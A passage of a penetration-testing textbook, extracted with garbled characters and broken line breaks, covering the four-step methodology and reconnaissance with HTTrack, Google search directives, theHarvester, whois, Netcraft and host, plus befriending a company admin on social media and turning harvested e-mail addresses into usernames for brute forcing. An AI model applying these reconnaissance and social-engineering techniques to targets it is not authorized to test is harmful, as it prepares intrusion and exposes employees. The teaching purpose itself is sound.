 in later phases we begin to drill down and focus on more specific  details of the target
 where is the target located? what is the iP address? what  operating system is the target running? what services and versions of software  are running on the system? As you can see each of these questions becomes  increasingly more detailed and granular
 it is also important to understand the order of each step
 the order in which  we conduct the steps is very important because the result or output of one step  needs to be used in the step below it
 You need to understand more than just  how to simply run the security tools in this book
 Understanding the proper  sequence in which they are run is vital to performing a comprehensive and  realistic penetration test
 for example many newcomers skip the reconnaissance phase and go straight  to exploiting their target
 not completing steps 1 and 2 will leave you with a  significantly smaller target list and attack vector on each target
 in other words  you become a one-trick-pony
 Although knowing how to use a single tool  might be impressive to your friends and family it is not to the security commu- nity and professionals who take their job seriously
 it may also be helpful for newcomers to think of the steps we will cover as a  circle
 it is very rare to find critical systems exposed directly to the internet in  todaye28099s world
 in many cases penetration testers must access and penetrate a  series of related targets before they have a path to reach the original target
 in  these cases each of the steps is often repeated
 figure 1
4 introduces the meth- odology as a cyclical process
 fIGURE 1
4 Cyclical Representation of the ZEH Methodology
 0cWhat Is penetration Testing? ChApTER 1 13 Zero Entry hacking: A four-Step Model let us briefly review each of the four steps that will be covered so you have a  solid understanding of them
 the first step in any penetration test is e2809crecon- naissance
e2809d this phase deals with information gathering about the target
 As  was mentioned previously the more information you collect on your target  the more likely you are to succeed in later steps
 reconnaissance will be dis- cussed in detail in chapter 2
 regardless of the information you had to begin with after completing in- depth reconnaissance you should have a list of target iP addresses that can be  scanned
 the second step in our methodology can be broken out into two dis- tinct activities
 the first activity we conduct is port scanning
 once we have fin- ished with port scanning we will have a list of open ports and potential service  running on each of the targets
 the second activity in the scanning phase is vul- nerability scanning
 Vulnerability scanning is the process of locating and iden- tifying specific weaknesses in the software and services of our targets
 with the results from step 2 in hand we continue to the e2809cexploitatione2809d phase
  once we know exactly what ports are open what services are running on those  ports and what vulnerabilities are associated with those services we can begin  to attack our target
 this is the phase that most newcomers associate with  e2809creale2809d hacking
 exploitation can involve lots of different techniques tools and  code
 we will review a few of the most common tools in chapter 4
 the ulti- mate goal of exploitation is to have administrative access (complete control)  over the target machine
 the final phase we will examine is e2809cmaintaining access
e2809d oftentimes the  payloads delivered in the exploitation phase provide us with only tempo- rary access to the system
 Because most payloads are not persistent we need  to create a more permanent backdoor to the system
 this process allows our  administrative access to survive program closures and even reboots
 As an ethi- cal hacker we must be very careful about the use and implementation of this  phase
 we will discuss how to complete this step as well as the ethical implica- tions of using backdoor or remote control software
 Although not included as a formal step in the penetration testing methodol- ogy the final (and arguably the most important) activity of every Pt is the  report
 regardless of the amount of time and planning you put into conduct- ing the penetration test the client will often judge your work and effectiveness  on the basis of the quality of your report
 the final Pt report should include all  the relevant information uncovered in your test and explain in detail how the  test was conducted and what was done during the test
 whenever possible mit- igations and solutions should be presented for the security issues you uncov- ered
 finally an executive summary should be included in every Pt report
 the  purpose of this summary is to provide a simple one- to two-page nontechni- cal overview of your findings
 this report should highlight and briefly sum- marize the most critical issues your test uncovered
 it is vital that this report  Openmirrors
com 0cThe Basics of hacking and penetration Testing 14 be readable (and comprehendible) by both technical and nontechnical person- nel
 it is important not to fill the executive summary with too many technical  details; that is the purpose of the detailed report
 ChApTER REvIEW this chapter introduced the concept of penetration testing and hacking as a  means of securing systems
 it also discussed the various roles and charac- ters that take part in the hacking scene
 the chapter examined the basics of  Backtrack linux including how to boot up login start x get an iP address  and shutdown
 we talked about how to set up your own isolated Pt lab so you  have a place to practice without fear of breaking the law and we wrapped up by  reviewing the steps of a penetration test
 it should be noted that there are several alternatives to Backtrack
 At some  point you may want to review and explore these other distributions
 matriux  is similar to Backtrack but also includes a windows binary directory that can be  used and accessed directly from a windows machine
 fedora security spin is a  collection of security-related tools built off of the fedora distribution
 kAtAnA  is a multi-boot dVd that gathers a number of different tools and distributions  into a single location
 finally you may want to explore the classic std distri- bution as well as Pentoo and Blackbuntu
 there are many other linux pen- etration testing distributionse28094a simple google search for e2809clinux Penetration  testing distributionse2809d will provide you with a plethora of options
 You could  also spend some time building and customizing your own linux distribution  by collecting and installing tools as your hacking career progresses
 SUMMARy this chapter introduced the concept of penetration testing and ethical hack- ing
 A special e2809cbasics onlye2809d four-step methodology including reconnaissance  scanning exploitation and maintaining Access was presented and explained
  information for setting up and using Backtrack linux including configuring  a network connection and issuing commands in a terminal window was pre- sented
 the use and creation of a penetration testing lab was outlined
 this will  allow you to practice your skills in a safe and sandboxed environment
 it will  also allow for completing and following along with the examples detailed in this  book
 0c15 Reconnaissance ChApTER 2 Information in This Chapter: n HTTrack: Website Copier n Google Directivese28094Practicing Your Google-Fu n The Harvester: Discovering and Leveraging E-mail Addresses n Whois n Netcraft n Host n Extracting Information from DNS n Extracting Information from E-mail Servers n MetaGooFil n Social Engineering n Sifting through the Intel to Finding Attackable Targets 0cThe Basics of hacking and penetration Testing 16 INTRODUCTION in most cases people who attend hacking workshops or classes have a basic  understanding of a few security tools
 typically these students have used a  port scanner to examine a system or maybe they have used wireshark to exam- ine network traffic
 some have even played around with exploit tools like  metasploit
 Unfortunately most beginners do not understand how these tools  fit into the grand scheme of a penetration test
 As a result their knowledge is  incomplete
 following a methodology ensures that you have a plan and know  what to do next
 to stress the importance of using and following a methodology it is often ben- eficial to describe a scenario that helps demonstrate both the importance of  this step and the value of following a complete methodology when conducting  a penetration test
 Assume you are an ethical penetration tester working for a security  company
 Your boss walks over to your office and hands you a piece of  paper
 e2809cI just got off the phone with the CEO of that company
 He wants  my best employee to Pen Test his company e28093 thate28099s you
 Our Legal  Department will be sending you an email confirming we have all of the  proper authorizations and insurancee2809d
 You nod accepting the job
 He  leaves
 You flip over the paper a single word is written on the paper  e2809cSyngress
e2809d Ite28099s a company youe28099ve never heard of before and no other  information is written on the paper
 What now? the first step in every job is research
 the more thoroughly you prepare for a  task the more likely you are to succeed
 the guys who created Backtrack linux  are fond of quoting Abraham lincoln who said e2809cif i had six hours to chop  down a tree ie28099d spend the first four of them sharpening my axe
e2809d this is a per- fect introduction to both penetration testing and the reconnaissance phase
 Reconnaissance also known as information gathering is arguably the most  important of the four phases we will discuss
 the more time you spend col- lecting information on your target the more likely you are to be successful in  the later phases
 ironically recon is also one of the most overlooked underuti- lized and misunderstood steps in Pt methodologies today
 it is possible that this phase is overlooked because newcomers are never for- mally introduced to the concept its rewards or how the results of good infor- mation gathering can be vital in later steps
 it is also possible that this phase is  overlooked because it is the least e2809ctechnical
e2809d oftentimes people who are new  to hacking tend to view this phase as boring and unchallenging
 nothing could  be further from the truth
 Although it is true that there are very few good automated tools that can be  used to complete recon once you understand the basics it is like an entirely  new way of looking at the world
 A good information gatherer is made up of  equal parts: hacker social engineer and private investigator
 Aside from the lack  Openmirrors
com 0cReconnaissance ChApTER 2 17 of tools the absence of well-defined rules of engagement also distinguishes this  phase from all others
 this is in stark contrast to the remaining steps in our  methodology
 for example when we discuss scanning in chapter 3 there is a  specific order and a clear series of steps that need to be followed in order to  properly port scan a target
 learning how to conduct digital reconnaissance is a valuable skill for anyone  living in todaye28099s world
 for penetration testers and hackers it is invaluable
  the penetration testing world is filled with great examples and stories of how  good recon single-handedly allowed the tester to fully compromise a network  or system
 consider the following example: assume we have two different criminals who  are planning to rob a bank
 the first criminal buys a gun and runs into the  first bank he finds yelling e2809cHAnds UP! giVe me All YoUr moneY!e2809d it is  not hard to imagine that the scene would be complete chaos and even if the  bungling burglar managed to get away it probably would not take long for the  police to find him arrest him and send him to prison
 contrast this to nearly  every Hollywood movie in existence today where criminals spend months  planning scheming organizing and reviewing details before the heist
 they  spend time getting weapons anonymously planning escape routes and review- ing schematics of the building
 they visit the bank to determine the position of  the security cameras make note of the guards and determine when the bank  has the most money or is the most vulnerable
 clearly the second criminal has  the better chance of getting away with the money
 it should be obvious that the difference between these two examples is prepa- ration and homework
 Hacking and penetration testing is the samee28094you can- not just get an iP address and start running metasploit (well you can but you  are probably not going to be very effective)
 recall the example used to begin this chapter
 You had been assigned to  complete a penetration test but were given very little information to go on
  As a matter of fact you were given only the company name one word
 the  million-dollar question for every aspiring hacker is e2809cHow do i go from a single  company name to owning the systems inside the network?e2809d when we begin  we know virtually nothing about the organization; we do not know their web- site physical address or number of employees
 we do not know their public  iP addresses or internal iP schemes; we know nothing about the technology  deployed operating systems used or defenses
 step 1 begins by conducting a thorough search of public information
 the great  thing about this phase is that in most cases we can gather a significant amount  of data without ever sending a single packet to the target
 Although it should  be pointed out that some tools or techniques used in reconnaissance do in fact  send information directly to the target it is important to know the difference  between which tools do and which tools do not touch the target
 there are two  main goals in this phase: first we need to gather as much information as pos- sible about the target; second we need to sort through all the information gath- ered and create a list of attackable iP addresses
 0cThe Basics of hacking and penetration Testing 18 in chapter 1 it was pointed out that a major difference between black hat and  white hat attackers is authorization
 step 1 provides us with a prime example of  this
 Both types of hackers conduct exhaustive reconnaissance on their targets
  Unfortunately malicious hackers are bound by neither scope nor authorization
 when ethical hackers conduct research they are required to stay within  the confines of the test
 during the information gathering process it is not  unheard-of for a hacker to uncover a vulnerable system that is related to the tar- get but not owned by the target
 even if the related target could provide access  into the original organization without prior authorization a white hat hacker  is not allowed to use or explore this option
 for example let us assume that  you are doing a penetration test against a company and you determine that  their web server (which contains customer records) is outsourced or managed  by a third party
 if you find a serious vulnerability on the customere28099s website  but you have not been explicitly authorized to test and use the website you  must ignore it
 the black hat attackers are bound by no such rules and will use  any means possible to access the target systems
 in most cases because you  were not authorized to test and examine these outside systems you will not be  able to provide a lot of detail; however your final report must include as much  information as possible about any systems that you believe put the organiza- tion at risk
 to be successful at reconnaissance you must have a strategy
 nearly all facets  of information gathering leverage the power of the internet
 A typical strategy  needs to include both active and passive reconnaissance
 Active reconnaissance includes interacting directly with the target
 it is important  to note that during this process the target may record our iP address and log  our activity
 Passive reconnaissance makes use of the vast amount of information available  on the web
 when we are conducting passive reconnaissance we are not inter- acting directly with the target and as such the target has no way of knowing  recording or logging our activity
 As mentioned the goal of reconnaissance is to collect as much information as  possible on your target
 At this point in the penetration test no detail should  be overlooked regardless of how innocuous it may seem
 while you are gath- ering information it is important to keep your data in a central location
  whenever possible it is helpful to keep the information in electronic format
  this allows for quick and accurate searches later on
 every hacker is a bit dif- ferent and there are still several hackers who prefer to print out all the infor- mation they gather
 each piece of paper is carefully cataloged and stored in a  folder
 if you are going to use the traditional paper method be sure to carefully  organize your records
 Paper-based information gathering binders on a single  target can quickly grow to several hundred pages
 in most cases the first activity is to locate the targete28099s website
 in our example  we would use a search engine to look for e2809csyngress
e2809d 0cReconnaissance ChApTER 2 19 hTTrack: WEBSITE COpIER typically we begin step 1 by closely reviewing the targete28099s website
 in some  cases we may actually use a tool called Httrack to make a page-by-page copy  of the website
 Httrack is a free utility that creates an identical off-line copy  of the target website
 the copied website will include all the pages links pic- tures and code from the original website; however it will reside on your local  fIGURE 2
1 Accessing the Newly Installed HTTrack
 ADDITIONAL RESOURCES It is important to understand that the more time you spend navigating and exploring  the target website the more likely it is that your activity can be tracked or traced   (even if you are simply browsing the site)
 Remember anytime you interact directly   with a resource owned by the target there is a chance you will leave a digital  fingerprint behind
 Advanced penetration testers can also run automated tools to extract additional or  hidden information from a local copy of a website
 HTTrack can be downloaded directly from the companye28099s website at: http://www
 httrack
com/
 Installing for Windows is as simple as downloading the installer 
exe  and clicking next
 If you want to install HTTrack in Backtrack you can connect to the  Internet as we described in Chapter 1 open a terminal and type: apt-get install webhttrack Once the program is installed in you can find it by clicking: Kstart e28692 Internet e28692  WebHTTrack Website Copier as shown in Figure 2
1
 The e2809cKstarte2809d is the small dragon icon in the lower left of the screen
 This provides you  access to many of the tools included with Backtrack
 The Kstart button is similar to  the Windows or Start button found in many Microsoft operating systems
 0cThe Basics of hacking and penetration Testing 20 computer
 Utilizing a website copying tool like Httrack allows us to explore  and thoroughly mine the website e2809coff-linee2809d without having to spend additional  time traipsing around on the companye28099s web server
 After we have installed the program we need to run it against our target
 Please  be aware that this activity is easy to trace and considered highly offensive
 never  run this tool without prior authorization
 once Httrack is started we are pre- sented with a number of web pages that allow us to set up and customize the  copy process
 each page allows us to change various aspects of the program  including language (english is default) project name the location where we  will store the copied website and the web address of the site you would like  to copy
 You can work your way through each of these pages by making the  desired changes to each option and clicking the e2809cnexte2809d button
 the final page  will include a e2809cstarte2809d button click this when you are ready to begin making a  copy of your targete28099s website
 the amount of time it takes for this process to  complete will depend on the size of your targete28099s website
 once Httrack has  finished copying the target website it will present you with a webpage allow- ing you to e2809cBrowse the mirrored websitee2809d in a browser or navigate to the path  where the site was stored
 whether you make a copy of the target website or you simply browse the tar- get in real time it is important to pay attention to details
 You should begin  by closely reviewing and recording all the information you find on the targete28099s  website
 oftentimes with very little digging you will be able to make some sig- nificant findings including physical address and locations phone numbers  e-mail addresses hours of operation business relationships (partnerships)  employee names social media connections and other public tidbits
 oftentimes when conducting a penetration test it is important to pay spe- cial attention to things like e2809cnewse2809d or e2809cAnnouncements
e2809d companies are  often proud of their achievements and unintentionally leak useful informa- tion through these stories
 company mergers and acquisitions can also yield  valuable data; this is especially important for expanding the scope and adding  additional targets to our penetration test
 even the smoothest of acquisitions  creates change and disarray in an organization
 there is always a transition  period when companies merge
 this transition period provides us with unique  opportunities to take advantage of the change and confusion
 even if merger  is old news or goes off without a hitch the information still provides value by  giving us additional targets
 merged or sibling companies should be authorized  and included in the original target list as they provide a potential gateway into  the organization
 finally it is important to search and review any open job postings for the tar- get company
 Job postings often reveal very detailed information about the  technology being used by an organization
 many times you will find specific  hardware and software listed on the job opening
 do not forget to search for  your target in the nationwide job banks as well
 for example assume you  come across a job requisition looking for a network Administrator with cisco  Openmirrors
com 0cReconnaissance ChApTER 2 21 AsA experience
 from this post you can draw some immediate conclusions  and make some educated guesses
 first you can be certain that the company  either uses or is about to use a cisco AsA firewall
 second depending on the  size of the organization you may be able to infer that the company does not  have or is about to lose someone with knowledge of how to properly use and  configure a cisco AsA firewall
 in either case you have gained valuable knowl- edge about the technology in place
 in most cases once we have thoroughly examined the targete28099s website we  should have a solid understanding of the target including who they are what  they do and where they are located
 Armed with this basic information about the target we move into passive  reconnaissance
 it is very difficult if not impossible for a company to deter- mine when a hacker or penetration tester is conducting passive reconnaissance
  this activity offers a low-risk high-reward situation for attackers
 recall that  passive reconnaissance is conducted without ever sending a single packet to  the target systems
 our weapon of choice to perform this task is the internet
  we begin by performing exhaustive searches of our target in the various search  engines available
 Although there are many great search engines available today when covering  the basics of hacking and penetration testing we will focus on google
 google  is very very good at its job
 there is a reason why the companye28099s stock trades  for $400ee80b2$600 a share
 spiders from the company aggressively and repeatedly  scour all corners of the internet cataloging information and send it back to the  google
 the company is so efficient at its job that oftentimes hackers can per- form an entire penetration test using nothing but google
 At defcon 13 Johnny long rocked the hacker community by giving a talk titled  e2809cgoogle Hacking for Penetration testers
e2809d this talk was followed up by a book  that dove even deeper into the art of google Hacking
 Although we would not dive into the specifics of google Hacking a solid  understanding of how to properly use google is vital to becoming a skilled  penetration tester
 if you ask people e2809cHow do you use google?e2809d they typically  respond by saying e2809cwell ite28099s simplee280a6You fire up a web browser navigate to  google and type what youe28099re searching for in the box
e2809d ADDITIONAL RESOURCES If you are interested in penetration testing it is highly suggested that you watch the  video and buy the book
 You can see the video for free online (check the Defcon  media archive) and the book is published by Syngress and available nearly anywhere
  Johnnye28099s discoveries have changed penetration testing and security forever
 Johnnye28099s  material is awesome and well worth your time
 0cThe Basics of hacking and penetration Testing 22 Although this answer is fine for 99 percent of the planet it is not good enough  for aspiring hackers
 You have to learn to search in a smarter way and maxi- mize the return results
 in short you must cultivate your google-fu
 learning  how to properly use a search engine like google will save you time and allow  you to find the hidden gems that are buried in the trillions of web pages on the  internet today
 GOOGLE DIRECTIvESe28094pRACTICING yOUR   GOOGLE-fU luckily for us google provides e2809cdirectivese2809d that are easy to use and help us get  the most out of every search
 these directives are keywords that enable us to  more accurately extract information from the google index
 consider the following example: assume you are looking for information on  the dakota state University website (dsu
edu) about me
 the simplest way to  perform this search is to enter the following terms (without the quotes) in a  google search box: e2809cpat engebretson dsu
e2809d this search will yield a fair number  of hits
 However of the first 50 websites returned only four were pulled directly  from the dsU website
 By utilizing google directives we can force the google index to do our bid- ding
 in the example above we know both the target website and the keywords  we want to search
 more specifically we are interested in forcing google to  return only results that are pulled directly from the target (dsu
edu) domain
 in  this case our best choice is to utilize the e2809csite:e2809d directive
 Using the e2809csite:e2809d direc- tive forces google to return only hits that contain the keywords we used and  come directly from the specified website
 to properly use a google directive you need three things: 1
 the name of the directive you want to use 2
 A colon 3
 the term you want to use in the directive After you have entered the three pieces of information above you can search  as you normally would
 to utilize the e2809csite:e2809d directive we need to enter the fol- lowing into a google search box: site:domain term(s) to search note that there is no space between the directive colon and domain
 in our  earlier example we wanted to conduct a search for Pat engebretson on the dsU  website
 to accomplish this we would enter the following command into the  google search bar: site:dsu
edu pat engebretson running this search provides us with drastically different results than our ini- tial attempt
 first we have trimmed the overall number of hits from 600ee80b1   0cReconnaissance ChApTER 2 23 to about 50
 there is little doubt that a person can sort through and gather  information from 50 hits much quicker than 600
 second and possibly more  importantly every single returned result comes directly from the target website
  Utilizing the e2809csite:e2809d directive is a great way to search a specific target and look  for additional information
 this directive allows you to avoid search overload  and to focus your search
 Another good google directive to use is e2809cintitle:e2809d or e2809callintitle:e2809d
 Adding either  of these to your search causes only websites that have your search words in the  title of the webpage to be returned
 the difference between e2809cintitle:e2809d and e2809callin- title:e2809d is straightforward
 e2809callintitle:e2809d will only return websites that contain all  the keywords in the web page title
 the e2809cintitle:e2809d directive will return any page  whose title contains at least one of the keywords you entered
 A classic example of putting the e2809callintitle:e2809d google hack to work is to perform  the following search: allintitle:index of Performing this search will allow us to view a list of any directories that have  been indexed and are available via the web server
 this is often a great place to  gather reconnaissance on your target
 if we want to search for sites that contain specific words in the Url we can  use the e2809cinurl:e2809d directive
 for example we can issue the following command to  locate potentially interesting pages on our targete28099s web page: inurl:admin this search can be extremely useful in revealing administrative or configuration  pages on your targete28099s website
 it can also be very valuable to search the google cache rather than the targete28099s  website
 this process not only reduces your digital footprints on the targete28099s  server making it harder to catch you it also provides a hacker with the occa- sional opportunity to view web pages and files that have been removed from  the original website
 the google cache contains a stripped-down copy of each  website that the google bots have spidered
 it is important to understand that  the cache contains both the code used to build the site and many of the files  that were discovered during the spidering process
 these files can be Pdfs ms  office documents like word and excel text files and more
 it is not uncommon today for information to be placed on the internet  by mistake
 consider the following example
 suppose you are a network  ALERT! It is worth noting that all searches in Google are case insensitive so e2809cpate2809d e2809cPate2809d and  e2809cPATe2809d will all return the same results! 0cThe Basics of hacking and penetration Testing 24 administrator for a company
 You use ms excel to create a simple workbook  containing all the iP addresses computer names and locations of the Pcs in  your network
 rather than carrying this excel spreadsheet around you decide  to publish it to the intranet where it will be accessible only by people within  your organization
 However rather than publishing this document to the  intranet website you mistakenly publish it to the company internet website
  if the google bots spider your site before you take this file down it is possible  the document will live on in the google cache even after you have removed it  from your site
 As a result it is important to search the google cache too
 we can use the cache: directive to limit our search results and show only infor- mation pulled directly from the google cache
 the following search will pro- vide us with the cached version of the syngress homepage: cache:syngress
com it is important that you understand that clicking on any of the Urls will bring  you to the live website not the cached version
 if you want to view specific  cached pages you will need to modify your search
 the last directive we will cover here is e2809cfiletype:e2809d
 we can utilize e2809cfiletype:e2809d to  search for specific file extensions
 this is extremely useful for finding specific  types of files on your targete28099s website
 for example to return only hits that con- tain Pdf documents you would issue the following command: filetype:pdf this powerful directive is a great way to find links to specific files like 
doc xlsx  ppt txt and many more
 Your options are nearly limitless
 for additional power we can combine multiple directives into the same search
  for example if we want to find all the PowerPoint presentations on the dsU  website you would enter the following command into the search box: site:dsu
edu filetype:ppt in this case every result that is returned is a PPt file and comes directly from  the dsu
edu domain! figure 2
2 shows a screenshot of two searches: the first  fIGURE 2
2 The Power of Google Directives
 0cReconnaissance ChApTER 2 25 utilizes google directives and the second shows the results from a traditional  search
 Utilizing google directives has drastically reduced the number of hits  (by 33364!)
 there are many other types of directives and google hacks that you should  become familiar with
 Along with google it is important that you become  efficient with several other search engines as well
 oftentimes different search  engines will provide different results even when you search for the same key- words
 As a penetration tester conducting reconnaissance you want to be as  thorough as possible
 As a final warning it should be pointed out that these passive searches are only  passive as long as you are searching
 once you make a connection with the  target system (by clicking on any of the links) you are back to active mode
 Be  aware that active reconnaissance without prior authorization is likely an illegal  activity
 once you have thoroughly reviewed the targete28099s web page and conducted  exhaustive searches utilizing google and other search engines it is important to  explore other corners of the internet
 newsgroups and Bulletin Board systems  like Usenet and google groups can be very useful for gathering information  about a target
 it is not uncommon for people to use these discussion boards  to post and receive help with technical issues
 Unfortunately (or fortunately  depending on which side of the coin you are looking at) employees often  post very detailed questions including sensitive and confidential information
  for example consider a network administrator who is having trouble getting  his firewall properly configured
 it is not uncommon to witness discussions  on public forums where these admins will post entire sections of their config  files
 to make matters worse many people post using their company e-mail  addresses
 this information is a virtual gold mine for an attacker
 even if our network admin is smart enough not to post detailed configuration  files it is hard to get support from the community without inadvertently leak- ing some information
 reading even carefully scrubbed posts will often reveal  specific software version hardware models current configuration information  and the like about internal systems
 All this information should be filed away  for future use
 Public forums are an excellent way to share information and receive technical  help
 However when using these resources be careful to use a slightly more  anonymous e-mail address like gmail or Hotmail rather than your corporate  address
 the explosive growth in social media like facebook myspace and twitter pro- vides us with new avenues to mine data about our targets
 when performing  reconnaissance it is a good idea to use these sites to our advantage
 consider  the following fictitious example: You are conducting a penetration test against  a small company
 Your reconnaissance has led you to discover that the network  administrator for the company has a twitter and facebook account
 Utilizing a  0cThe Basics of hacking and penetration Testing 26 little social engineering you befriend the unsuspecting admin and follow him  on both facebook and twitter
 After a few weeks of boring posts you strike the  jackpot
 He makes a post on facebook that says e2809cgreat
 firewalled died with- out warning today
 new one being sent over-night
 looks like ie28099ll be pulling an  all-nighter tomorrow to get things back to normal
e2809d Another example would be a Pc tech who posts e2809cProblem with latest  microsoft patch had to uninstall
 will call ms in the morning
e2809d or even the following e2809cJust finished the annual budget process
 looks like ie28099m  stuck with that server 2000 for another year
e2809d Although these examples may seem a bit over the top you will be surprised  at the amount of information you can collect by simply monitoring what  employees post online
 ThE hARvESTER: DISCOvERING AND   LEvERAGING E-MAIL ADDRESSES An excellent tool to use in reconnaissance is the Harvester
 the Harvester is  a simple but highly effective Python script written by christian martorella at  edge security
 this tool allows us to quickly and accurately catalog both e-mail  addresses and subdomains that are directly related to our target
 it is important to always use the latest version of the Harvester as many search  engines regularly update and change their systems
 even subtle changes to a  search enginee28099s behavior can render automated tools ineffective
 in some cases  search engines will actually filter the results before returning information to  you
 many search engines also employ throttling techniques that will attempt  to prevent you from running automated searches
 the Harvester can be used to search google Bing and PgP servers for e-mails  hosts and subdomains
 it can also search linkedin for user names
 most peo- ple assume their e-mail address is benign
 we have already discussed the dan- gers of posting to public forums using your corporate e-mail address; however  there are additional hazards you should be aware of
 let us assume during your  reconnaissance you discover the e-mail address of an employee from your tar- get organization
 By twisting and manipulating the information before the e2809c@e2809d  symbol we should be able to create a series of potential network usernames
  it is not uncommon for organizations to use the exact same user names and  e-mail addresses (before the e2809c@e2809d symbol)
 with a handful of prospective user- names we can attempt to brute force our way into any services like ssH VPns  or ftP that we (will) discover during the next step 2 (scanning)
 the Harvester is built into Backtrack
 to access the Harvester use the following  steps: 1
 click on the kstart dragon located in the lower left corner of your screen
 2
 Highlight e2809cBacktracke2809d at the top of the menu
 0cReconnaissance ChApTER 2 27 3
 Highlight e2809cinformation gathering
e2809d 4
 Highlight e2809cAll
e2809d 5
 select e2809ctheHarvestere2809d (note tools are listed in alphabetical order)
 You can also open a terminal window and navigate to the Harvester directory  by issuing the following command: cd /pentest/enumeration/google/theharvester regardless of whether you have downloaded the Harvester or used the ver- sion installed in Backtrack we will use it to collect additional information  about our target
 Be sure you are in theHarvester folder and run the following  command: 
/theHarvester
py e28093d syngress
com e28093l 10 e28093b google this command will search for e-mails subdomains and hosts that belong to  syngress
com
 figure 2
3 shows our results
 Before discussing the results of our tool let us examine the command a little  closer
 e2809c
/theHarvester
pye2809d is used to invoke the tool
 A lowercase e2809ce28093de2809d is  used to specify the target domain
 A lowercase e2809ce28093le2809d (that is an l not a 1) is  used to limit the number of results returned to us
 in this case the tool was  instructed to return only 10 results
 the e2809ce28093be2809c is used to specify what public  repository we want to search
 we can choose among google Bing PgP or  linkedine28094for this example we chose to search using google
 now that you fully understand the command that was run let us take a look at  the results
 As you can see the Harvester was effective in locating at least two e-mail  addresses that could be of value to us
 Please note the e-mail addresses in the  screenshot have been circled and obfuscated
 the Harvester was also successful  ADDITIONAL RESOURCES If you are using an operating system other than Backtrack you can download the tool  directly from Edge Security at: http://www
edge-security
com
 Once you have got it  downloaded you can unpack the downloaded tar file by running the following command  in a terminal: tar xf theHarvester Please note the capital e2809cHe2809d that is used when untarring the code
 Linux is case  sensitive so the operating system sees a difference between e2809ctheHarvestere2809d and  e2809ctheharvester
e2809d You will need to pay attention to the executable to determine if you  should use a capital or lowercase e2809ch
e2809d If the cases do not match exactly you will  typically get a message saying e2809cno such file or directory
e2809d This is a good indication that  you have mistyped the name of the file
 0cThe Basics of hacking and penetration Testing 28 in finding at least two additional subdomains
 Both e2809cbooksite
syngress
come2809d  and e2809cebook__www
syngress
come2809d need to be fully recone28099d
 we simply add these  new domains to our target list and begin the reconnaissance process again
 step 1 of reconnaissance is very cyclical because in-depth reconnaissance often  leads to the discovery of new targets which in turn leads to additional recon- naissance
 As a result the amount of time to complete this phase will vary  from several hours to several weeks
 remember a determined malicious hacker  understands not only the power of good reconnaissance but also that of a  nearly limitless amount of time
 As an aspiring penetration tester you should  devote as much time as possible to practicing and conducting information  gathering
 WhOIS A very simple but effective means for collecting additional information about  our target is whois
 the whois service allows us to access specific information  about our target including the iP addresses or host names of the companye28099s  domain name systems (dns) servers and contact information usually con- taining an address and phone number
 whois is built into the linux operating system
 the simplest way to use this  service is to open a terminal and enter the following command: whois target_domain fIGURE 2
3 Output of the Harvester
 0cReconnaissance ChApTER 2 29 for example to find out information about syngress we would issue the fol- lowing command: e2809cwhois syngress
com
e2809d figure 2
4 shows a partial output  from the result of this tool
 it is important to record all the information and pay special attention to the  dns servers
 if the dns servers are listed by name only as shown in figure  2
4 we will use the Host command to translate those names into iP addresses
  we will discuss the host command in the next section
 You can also use a web  browser to search whois
 By navigating to http://www
whois
net you can  search for your target in the e2809cwHois lookupe2809d box as shown in figure 2
5
 Again it is important to closely review the information you are presented with
  sometimes the output will not provide many details
 we can often access  these additional details by querying the specific whois server listed in the out- put of our original search
 figure 2
6 shows an example of this
 fIGURE 2
4 Partial Output from a Whois Query
 fIGURE 2
5 Whois
nete28094A Web-Based Lookup Tool
 0cThe Basics of hacking and penetration Testing 30 we can conduct a further whois search by following the link provided in the  e2809creferral Url:e2809d field
 You may have to search the webpage for a link to their  whois service
 By using safenamee28099s whois service we can extract a significantly  larger amount of information as shown here: The Registry database contains ONLY 
COM 
NET 
EDU domains and Registrars
[whois
safenames
net] Safenames Whois Server Version 2
0 Domain Name: SYNGRESS
COM  [REGISTRANT]    Organisation Name: Elsevier Ltd    Contact Name:      Domain Manager    Address Line 1:    The Boulevard    Address Line 2:    Langford Lane Kidlington    City/Town:         Oxfordshire    State/Province:    Zip/Postcode:      OX5 1GB    Country:           UK    Telephone:         ee80b144 (18658) 43830    Fax:               ee80b144 (18658) 53333    Email:             domainsupport@elsevier
com  [ADMIN]    Organisation Name: Safenames Ltd    Contact Name:      International Domain Administrator    Address Line 1:    PO Box 5085    Address Line 2:    City/Town:         Milton Keynes MLO    State/Province:    Bucks    Zip/Postcode:      MK6 3ZE    Country:           UK    Telephone:         ee80b144 (19082) 00022    Fax:               ee80b144 (19083) 25192    Email:             hostmaster@safenames
net fIGURE 2
6 Whois Output Showing Where to Go for Additional Details
 Openmirrors
com 0cReconnaissance ChApTER 2 31  [TECHNICAL]    Organisation Name:       International Domain Tech    Contact Name:            International Domain Tech    Address Line 1:          PO Box 5085    Address Line 2:    City/Town:               Milton Keynes MLO    State/Province:          Bucks    Zip/Postcode:            MK6 3ZE    Country:                 UK    Telephone:               ee80b144 (19082) 00022    Fax:                     ee80b144 (19083) 25192    Email:                   tec@safenames
net NETCRAfT Another great source of information is netcraft
 You can visit their site at  http://news
netcraft
com
 start by searching for your target in the e2809cwhate28099s that  site running?e2809d textbox as shown in figure 2
7
 netcraft will return any websites it is aware of that contain your search words
  in our example we are presented with three sites: syngress
com www
syngress
 com and booksite
syngress
com
 if any of these sites have escaped our previous  searches it is important to add them to our potential target list
 the returned  results page will allow us to click on a e2809csite report
e2809d Viewing the site report  should provide us with some valuable information as shown in figure 2
8
 As you can see the site report provides us with some great information about  our target including the iP address and os of the web server as well as the dns  server
 once again all this information should be cataloged and recorded
 hOST oftentimes our reconnaissance efforts will result in host names rather than iP  addresses
 when this occurs we can use the e2809choste2809d tool to perform a transla- tion for us
 the host tool is built into Backtrack
 we can access it by opening a  terminal and typing: root@bt~# host target_hostname fIGURE 2
7 Netcraft Search Option
 0cThe Basics of hacking and penetration Testing 32 in our previous searches we uncovered a dns server with the host name e2809cns1
 dreamhost
com
e2809d to translate this into an iP address we would enter the fol- lowing command in a terminal: host ns1
dreamhost
com figure 2
9 shows the result of this tool
 the host command can also be used in reverse
 it can be used to translate iP  addresses into host names
 to perform this task simply enter: root@bt~# host IP address Using the e2809c-ae2809d switch will provide you with verbose output and possibly reveal  additional information about your target
 it is well worth your time to review  the e2809choste2809d documentation and help files
 You can do so by issuing the e2809cman  hoste2809d command in a terminal window
 this help file will allow you to become  familiar with the various options that can be used to provide additional func- tionality to the e2809choste2809d tool
 EXTRACTING INfORMATION fROM DNS dns servers are an excellent target for hackers and penetration testers
 they  usually contain information that is considered highly valuable to attackers
